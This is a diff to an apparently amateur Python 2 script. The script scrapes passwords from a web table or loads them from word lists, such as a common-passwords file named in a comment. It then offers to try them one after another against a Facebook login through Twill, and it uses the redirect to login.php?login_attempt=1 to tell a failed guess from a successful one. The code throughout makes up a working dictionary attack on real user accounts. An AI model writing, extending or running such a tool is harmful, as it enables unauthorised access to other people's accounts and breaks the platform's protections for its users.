@@ -6,10 +6,8 @@
 # Extend program to keep pasting and trying password into a text box (possible)?
 # Notes to run this program you need to install pyperclip, BeautifulSoup, Twill, lxml, cssselect, requests
 
-import sys, pyperclip, urllib2
+import sys, pyperclip, urllib2, re, time
 from itertools import izip
-import re
-import time
 from bs4 import BeautifulSoup
 from pprint import pprint
 from twill.commands import *
@@ -18,6 +16,8 @@ from twill.commands import *
 # After experimenting in Twill-sh if we attempt to login to FB with a wrong password
 # We will get current page: https://www.facebook.com/login.php?login_attempt=1&lwv=110
 # If we login with a correct attempt we just get https://www.facebook.com
+
+d = {} #global dictionary
 
 def loginToSite(passwords):
     go('https://facebook.com/')
@@ -31,16 +31,17 @@ def loginToSite(passwords):
 def passwordFind(account, Passwords):
     if account in Passwords:
         pyperclip.copy(Passwords[account])
-        print('Password key value number/name ' + account + ' copied to clipboard.')
+        print('Password key value number/name (' + account + ') copied to clipboard.')
     else:
         print('There is no account named ' + account)
+    print ('Password gathered is: ') + Passwords[account]
     return Passwords[account]
 
 def yummySoup(account, page):
     soup = BeautifulSoup(page, "html.parser")
     all_tables=soup.find_all('table')
     right_table=soup.find('table', class_='table')
-    d = {}
+
     for row in right_table.findAll("tr"):
         AccountLines = row.findAll('td')
         if len(AccountLines)==8: #Only extract table body not heading
@@ -50,14 +51,27 @@ def yummySoup(account, page):
     return passwordFind(account, d)
 
 def passwordUpdate(filename):
+    example = {}
     d = {}
-    with open(filename) as f:
-        for line in f:
-           (key, val) = line.split()
-           d[key] = val
+    i = 1
+    print "Is the file numbered? (yes or no)"
+    answerString = raw_input()
+    if (answerString == "yes"):
+        with open(filename) as f:
+            for line in f:
+                (key, val) = line.split()
+                d[key] = val
+    elif (answerString == "no"):
+        with open(filename) as f:
+            key = 1
+            for line in f:
+                val = line
+                d[str(key)] = val
+                key = key + 1
     return d
+
 #Code for own document
-#Expand to take in almost any formant?
+#Expand to convert just a list of passwords to dictionary format (10000commmony)
 def main2(account, filename):
     start=time.clock()
     dicA = passwordUpdate(filename)
@@ -70,7 +84,6 @@ def main2(account, filename):
     elif yesOrNo == "no":
         print "OK!"
         quit(1)
-
 
     end=time.clock()
     main2time=end-start
@@ -93,6 +106,7 @@ def main(account):
     page = urllib2.urlopen(passwordPage)
 
     passwordString = yummySoup(account, page)
+
     print "Would you like to try to run it against a Facebook login? (yes or no)"
     yesOrNo = raw_input()
     if yesOrNo == "yes":
